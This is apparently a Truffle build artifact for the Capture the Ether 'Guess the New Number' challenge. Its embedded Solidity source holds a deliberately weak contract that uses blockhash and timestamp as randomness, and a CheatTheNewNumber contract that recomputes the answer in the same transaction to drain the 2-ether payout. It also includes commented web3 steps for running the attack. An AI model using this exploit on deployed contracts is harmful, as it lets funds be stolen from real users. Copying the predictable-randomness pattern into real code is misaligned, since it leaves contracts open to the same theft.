{
  "contractName": "GuessTheNewNumberChallenge",
  "abi": [
    {
      "inputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "n",
          "type": "uint8"
        }
      ],
      "name": "guess",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x6060604052670de0b6b3a76400003414151561001a57600080fd5b610189806100296000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634ba4c16b14610051578063b2fa1c9e1461006c575b600080fd5b61006a600480803560ff16906020019091905050610099565b005b341561007757600080fd5b61007f61013c565b604051808215151515815260200191505060405180910390f35b6000670de0b6b3a7640000341415156100b157600080fd5b6001430340426040518083600019166000191681526020018281526020019250505060405180910390206001900490508060ff168260ff161415610138573373ffffffffffffffffffffffffffffffffffffffff166108fc671bc16d674ec800009081150290604051600060405180830381858888f19350505050151561013757600080fd5b5b5050565b6000803073ffffffffffffffffffffffffffffffffffffffff1631149050905600a165627a7a723058200aa9654d03b34e4a1ed12f32891b4a986abd91574dc8dda74e02d69a839f76100029",
  "source": "pragma solidity 0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n\r\n/*\r\nconst oneEth = web3.utils.toWei('1', 'ether');\r\nvar cheatTheNewNumber = await CheatTheNewNumber.deployed();\r\nvar balance = await cheatTheNewNumber.balance();\r\nweb3.utils.fromWei(balance);\r\nawait cheatTheNewNumber.guess({from: accounts[0], value: oneEth});\r\nawait cheatTheNewNumber.isComplete();\r\n\r\n// ropsten balance\r\nweb3.eth.getBalance('0xd20FF949eb2A487823828B9E14Ab39cF8C31eb11')\r\n\r\n\r\n// development balance\r\nweb3.eth.getBalance('0x3C5a99d8f3b559618e56D993E73f10e4406699d5')\r\n*/\r\n\r\ncontract CheatTheNewNumber is OtherContract {\r\n\r\n    function isComplete() public view returns (bool) {\r\n        require(otherContract != 0);\r\n        GuessTheNewNumberChallenge guessTheNewNumberChallenge = GuessTheNewNumberChallenge(otherContract);\r\n        bool completed = guessTheNewNumberChallenge.isComplete();\r\n        return completed;\r\n    }\r\n\r\n    function guess() public payable {\r\n        require(otherContract != 0);\r\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\r\n\r\n        GuessTheNewNumberChallenge guessTheNewNumberChallenge = GuessTheNewNumberChallenge(otherContract);\r\n        guessTheNewNumberChallenge.guess.value(msg.value)(answer);\r\n\r\n        // only allow success if the guess was right\r\n        require(address(otherContract).balance == 0);\r\n    }\r\n\r\n    function balance() public view returns (uint256) {\r\n        require(otherContract != 0);\r\n        uint256 contractBalance = address(otherContract).balance;\r\n        return contractBalance;\r\n    }\r\n\r\n    function() public payable {\r\n    }\r\n\r\n    function withdraw() public { \r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n}\r\n\r\ncontract GuessTheNewNumberChallenge {\r\n    function GuessTheNewNumberChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function guess(uint8 n) public payable {\r\n        require(msg.value == 1 ether);\r\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\r\n\r\n        if (n == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\GuessTheNewNumberChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-11T16:06:44.634Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}